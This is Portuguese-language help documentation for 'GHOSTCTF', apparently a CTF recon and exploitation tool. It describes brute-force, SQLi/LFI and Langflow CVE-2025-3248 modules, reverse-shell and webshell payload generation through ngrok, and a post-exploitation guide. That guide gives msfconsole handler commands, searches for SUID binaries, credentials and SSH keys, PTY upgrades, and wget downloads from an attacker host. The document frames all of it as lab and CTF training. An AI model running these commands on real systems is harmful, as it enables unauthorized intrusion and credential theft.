O que são Findings?

    

      

        Findings são os achados do recon que o GHOSTCTF vai acumulando ao longo do scan:
        portas e serviços, URLs e tecnologias, parâmetros suspeitos, possíveis flags, credenciais vazadas, hits de módulos (LFI, SQLMap, WordPress, etc.) e sugestões de exploração.
      

      

        Cada cartão resume um item; a faixa colorida à esquerda indica prioridade (vermelho = alto, ciano = médio, verde = baixo). Clica num cartão para ver mais detalhe no terminal, quando aplicável.
      

      
Barra de pipeline (acima)

      
Mostra a fase atual do fluxo de trabalho, mapeada do recon clássico:

      
    
        
  • INPUT → alvo e opções
    • 
        
  • NMAP + SERVICE PROBES → portas TCP/UDP e banners
    • 
        
  • UDP / RDAP STAGE → estágio agregador (UDP / RDAP no modelo UI)
    • 
        
  • WEB PROBE + LINKS → HTTP, cabeçalhos, links
    • 
        
  • DIR ENUM / SURFACE → diretórios e superfície
    • 
        
  • URL DISCOVERY → robots, sitemap, descoberta de URLs
    • 
        
  • PARAMS + LFI/SQLMAP → parâmetros, LFI, SQLi
    • 
        
  • JS / DECODING → decoding de flags em conteúdo
    • 
        
  • DORKS / VALIDATION → validação e agrupamento
    • 
        
  • SECRETS / ATTACK VECTORS → segredos e vetores (placeholder no MVP)
    • 
        
  • KALI / EXPLOIT TOOLS → integração Kali (quando ligada)
    • 
        
  • PRIORITIZE + SAVE → scoring e gravação do run
    • 
      

      
Filtros (tabs)

      

        Cada tab aplica um critério ao campo interno do achado: prioridade (prio) ou tipo (type). Um cartão só aparece se corresponder à tab ativa.
      

      
Por gravidade (prioridade)

      
    
        
  • ALL — lista completa, sem filtro; útil para rever tudo de uma vez.
    • 
        
  • 🔴 HIGH — só achados marcados como alta prioridade (ex.: flags, credenciais, LFI/SQLi fortes, brute bem-sucedido).
    • 
        
  • 🟡 MED — prioridade média (ex.: muitos endpoints técnicos, SQLMap sem enum completa, disclosure relevante).
    • 
        
  • 🟢 LOW — prioridade baixa (recon de rotina, tech genérico, ruído útil mas menos urgente).
    • 
      

      
Por tipo de achado — corresponde ao type guardado com cada finding:

      
    
        
  • ENDPOINTS — URLs, serviços contactados, caminhos descobertos (HTTP, FTP OK, MySQL handshake, etc.).
    • 
        
  • PARAMS — parâmetros de URL / vetores (inclui LFI e outros testes em query).
    • 
        
  • FLAGS — possíveis flags da plataforma (ex.: Solyd{…}) após validação/decoding.
    • 
        
  • SECRETS — credenciais, comentários suspeitos, leaks em HTML/disclosure, credenciais de brute.
    • 
        
  • NMAP — linhas de portas/serviços derivadas do scan.
    • 
        
  • EXPLOIT.DB — entradas ligadas ao searchsploit / Exploit-DB (quando o módulo corre).
    • 
        
  • NUCLEI — resultados Nuclei (quando integrados no fluxo / runs com essa origem).
    • 
        
  • WPSCAN — achados do WPScan em JSON (plugins, versões, issues).
    • 
        
  • XSS — reflexões / indícios XSS classificados com este tipo.
    • 
        
  • SQLI — injeção SQL / hits SQLMap (HTTP ou WebSocket).
    • 
        
  • SEC — cabeçalhos e notas de security HTTP (CSP, HSTS, etc.) quando classificadas assim.
    • 
        
  • TLS — informação de certificado / TLS quando existir finding dedicado.
    • 
        
  • RDAP — dados RDAP/whois-style quando o pipeline emitir findings deste tipo.
    • 
      

      

        Algumas tabs podem ficar vazias num run concreto (ex.: sem Nuclei, sem XSS) — isso é normal. A barra de estatísticas em baixo resume contagens globais; JSON / MD / TXT exportam tendo em conta a lista visível / filtro atual.

    •

    •

    •

    •

    •

    •

    •

    •

    •

    •

    • 
        
  • WPScan — ferramenta externa pesada; JSON para findings (opcional).
    •

Agressivo (só CTF / autorização)

      2. 
            
    2. Wordlists Solyd — com o checkbox dedicado, o hydra usa wordlists/usersolyd.txt e wordlists/passwordsolyd.txt na raiz do projeto GHOSTCTF (listas agregadas a partir do histórico/write-ups Solyd). Corre depois do subset e antes do rockyou completo; é mais curto que o SecLists+rockyou.
      3. 
            
    3. Hydra automático (SecLists + rockyou.gz) — última fase, com timeout longo (minutos); combinações enormes — pode demorar muito. Requer o respetivo checkbox e ficheiros típicos de Kali (top-usernames-shortlist.txt, rockyou.txt.gz ou rockyou.txt).
      4. 
          
    
          Podes correr só Solyd ou só automático deixando o subset manual vazio, desde que ligues as opções certas e o SSH brute base.
        
    • 
        
  • WP brute (hydra) — http(s)-post-form em wp-login.php; precisa de users + wordlist e URLs WP descobertos.
    • 
        
  • Langflow CVE-2025-3248 — exploração de validate/code e opcional vértices / reverse shell; extremamente sensível — só em lab.
    • 
      


      
Crack Mode

      

        Não faz parte do stream do recon: corre no servidor via API sob demanda.
        MD5 crack — hash 32 hex + wordlist opcional.
        A linha john:✓ / fallback-wordlist indica se o John e wordlists foram detetados no host.
      

      

        John Crack — cola o hash, escolhe formato (raw-md5, bcrypt, …), wordlist opcional.
        rules aplica regras do John; incremental gera candidatos por modo (Digits/Alnum/ASCII) quando não há wordlist ou como complemento.

Wandenreich — payloads automáticos

    

      

        Wandenreich concentra a criação automática de ficheiros no repositório (payloads/), integração ngrok e mini-nc.
        O recon (Upload surface) só sugere formulários — o upload no alvo é sempre manual.
      

      
Ngrok

      

        Túnel TCP público (ex. 0.tcp….ngrok.io:15248) → porta local do nc.
        API local: http://127.0.0.1:4040/api/tunnels ou GHOSTCTF_NGROK_API.
      

      
    
        
  • Ler ngrok → LHOST/LPORT — com ngrok tcp <porta local> a correr, preenche o endpoint público nos campos do payload.
    • 
        
  • Iniciar ngrok tcp + preencher — o servidor tenta arrancar ngrok tcp e faz poll (PATH + authtoken).
    • 
        
  • Porta local = destino do túnel e do mini-nc; LPORT no payload com ngrok é a porta pública.
    • 
      

      
Pasta payloads/

      
    
        
  • Ficheiros na raiz do projeto GHOSTCTF (payloads/), úteis para python3 -m http.server ou upload no alvo.
    • 
        
  • Tipo de ficheiro — escolhe no menu (PHP, shell, Python, Perl, Ruby, Node, JSP, PDF+PHP polyglot, PowerShell, webshell).
    • 
        
  • Gravar + mini-nc — para payloads reverse TCP, abre o painel e nc -nlvp na porta local; webshell não usa listener.
    • 
        
  • PDF + PHP — cabeçalho PDF mínimo + mesmo reverse PHP (cenários de upload/LFI em CTF); o alvo tem de interpretar PHP no contexto do desafio.
    • 
      

      

        curl (exemplo): curl -k -F "ficheiro=@shell.php" … — o name do campo deve bater com o HTML.

Manual — depois da shell reversa ligar

    

      

        Quando o mini-nc ou o teu nc -nlvp mostra uma linha de comando, estás dentro do servidor alvo (muitas vezes como www-data, apache, etc.).
        Isto é um guia de enumeração inicial em CTF / lab autorizado — não é “lista de vírus”; é ver onde estás, que ficheiros há e onde pode estar o payload que enviaste.
      

      
Alvos e sessões — há comando para “ver alvos e escolher”?

      

        Não dentro do mini-nc do GhostCTF nem do netcat clássico numa única porta.
        Um nc -nlvp 4444 (ou o mini-terminal ligado ao mesmo WebSocket) aceita uma ligação de cada vez nessa porta: quando o payload conecta, a shell que vês é só essa. Não há lista integrada de “todos os alvos” nem menu para trocar de sessão — isso não faz parte do protocolo TCP simples do nc.
      

      
    
        
  • Várias shells ou várias máquinas — usa portas diferentes e um listener por porta (ex.: 4444, 4445), ou terminais separados no Kali, cada um com o seu nc.
    • 
        
  • Listar sessões e escolher uma — típico no Metasploit: após o handler receber reverses, corre sessions -l para ver a tabela de sessões e sessions -i 1 (troca 1 pelo ID) para interagir com a que quiseres. Exemplo de arranque: msfconsole -q -x "use exploit/multi/handler; set payload php/reverse_php; set LHOST …; set LPORT …; exploit -j" (ajusta payload/LHOST/LPORT).
    • 
        
  • Ferramentas com gestão de múltiplas shells — por exemplo pwncat-cs, Sliver, ou frameworks comerciais; o fluxo do Wandenreich + ficheiro em payloads/ continua igual; só mudas o listener no teu lado.
    • 
      

      

        Resumo: o payload “escolhe” o alvo no momento em que corre na máquina onde foi executado; no teu PC escolhes qual listener (qual porta / qual ferramenta) está à espera dessa ligação.
      

      
1. Confirmar a sessão

      
    
        
  • whoami — utilizador atual.
    • 
        
  • id — grupos (útil para saber se há docker, sudo, etc.).
    • 
        
  • hostname · pwd — máquina e diretório atual (muitas vezes a pasta do site).
    • 
        
  • uname -a — kernel (pistas para exploit local).
    • 
      

      
2. Ver ficheiros “à volta” (lista no alvo)

      
    
        
  • ls -la — conteúdo do diretório atual, incluindo ocultos.
    • 
        
  • ls -la .. — pasta pai (subir um nível).
    • 
        
  • find . -maxdepth 3 -type f 2>/dev/null | head -50 — amostra de ficheiros próximos sem inundar o terminal.
    • 
      

      
3. Onde está o ficheiro que enviaste (payload / upload)

      

        O GhostCTF grava no teu PC em payloads/rev_… ou cmd.php; no alvo o ficheiro fica onde o upload ou o RCE o colocou (caminho depende do desafio).
      

      
    
        
  • Se acabaste de obter shell via web, começa por pwd e ls -la — costuma ser algo como /var/www/html, /var/www/…/uploads, /home/…/public_html.
    • 
        
  • Procurar pelo nome que usaste (ex.: rev_, .php):
    find /var/www -name '*.php' 2>/dev/null | head -30
    • 
        
  • Alternativa mais larga (pode ser lenta):
    find / -name 'cmd.php' 2>/dev/null ou parte do nome do ficheiro gravado.
    • 
      

      

        Ver o ficheiro no alvo serve para confirmar o caminho, apagar vestígios em lab, ou perceber permissões (quem pode ler/escrever).
      

      
4. O que fazer a seguir (CTF típico)

      
    
        
  • Procurar flags: ls -la /home/*, cat flag.txt, find / -name 'flag*' 2>/dev/null | head (ajusta ao formato do desafio).
    • 
        
  • Ficheiros sensíveis: .env, configs em /var/www, backups .bak, chaves SSH em ~/.ssh se tiveres acesso.
    • 
        
  • Escalar privilégios: sudo -l, binários SUID (find / -perm -4000 2>/dev/null), cron (cat /etc/crontab), serviços em portas internas.
    • 
      

      
5. Melhorar o terminal

      

        A shell pode vir “crua”. Na sidebar, o bloco Shell reversa — PTY tem a sequência script / TERM / python3 -c … pty para autocomplete e Ctrl+C mais seguros.
      

      

        Usa apenas em alvos que te pertençam ou com autorização explícita (CTF, pentest contratado).
      

    

  







  

    
    
Decode rápido (Base64 / Base32)

    

      

        Cola na caixa texto que suspeites estar em Base64 ou Base32 (muito comum em CTF: flags escondidas em páginas, cookies, JWT payload, etc.).
        O botão Decode envia o conteúdo ao servidor, que tenta decodificar de forma tolerante (padding, URL-safe Base64).
      

      

        Base64 — alfabeto A–Z, a–z, 0–9, +// (ou -/_ na variante URL). O output é texto UTF-8 quando possível.
      

      

        Base32 — letras A–Z e dígitos 2–7; por vezes usado em desafios e OTP. Se a string não for válida, o decode falha com mensagem clara.
      

      

        O botão # Hash calcula um hash rápido do texto colado (útil para comparar com hashes conhecidos ou encadear com o modo Crack mais abaixo). Tudo isto corre só quando carregas no botão — não faz parte do pipeline automático do recon.
      

    

  







  

    
    
Shell reversa — PTY

    

      

        Quando recebes uma shell com nc ou payload sem TTY, o terminal está cru: sem autocomplete, Ctrl+C pode matar a sessão, e editores como vim não funcionam bem.
        A sequência abaixo no alvo aloca um pseudo-terminal (PTY) e melhora a experiência.
      

      
Ordem recomendada (cola uma linha de cada vez):

      
    
        
  1. script -qc /bin/bash /dev/null — arranca uma shell dentro do utilitário script, com pseudo-TTY (método muito usado em CTF; o binário pode ser bash ou sh conforme o alvo).
    2. 
        
  2. export TERM=xterm — diz ao sistema que o terminal remoto comporta-se como xterm (cores, teclas especiais, clear, etc.).
    3. 
        
  3. python3 -c 'import pty; pty.spawn("/bin/bash")' — reforça uma shell interativa com PTY (se não houver python3, tenta python no alvo).
    4. 
      

      

        Usa os botões Copiar ao lado de cada linha para colar no alvo sem erros de aspas.
        Alternativa clássica: no teu nc fazer Ctrl+Z, depois stty raw -echo; fg e Enter — a sequência ①②③ costuma ser mais simples em write-ups Solyd.
      

    

  







  

    
    
Servidor HTTP (máquina atacante)

    

      

        Serve ficheiros da tua máquina (Kali/host) para o alvo descarregar com wget ou curl — típico em CTF para passar exploits, linpeas, chaves ou scripts quando já tens execução de comandos no servidor.
      

      

        Define a porta (ex.: 8000) e carrega em Copiar python3 -m http.server. No diretório onde estão os ficheiros que queres expor, corre o comando no teu terminal.
      

      

        No alvo, usa o teu IP alcançável (VPN, tun0, eth0, IP público se aplicável) e a porta, por exemplo:
        wget http://TEU_IP:8000/ficheiro ou curl -O http://TEU_IP:8000/ficheiro.
        Garante que firewall no teu host permite entrada nessa porta.
      

      

        Isto é só uma referência rápida na UI — o servidor GhostCTF não inicia o http.server por ti.
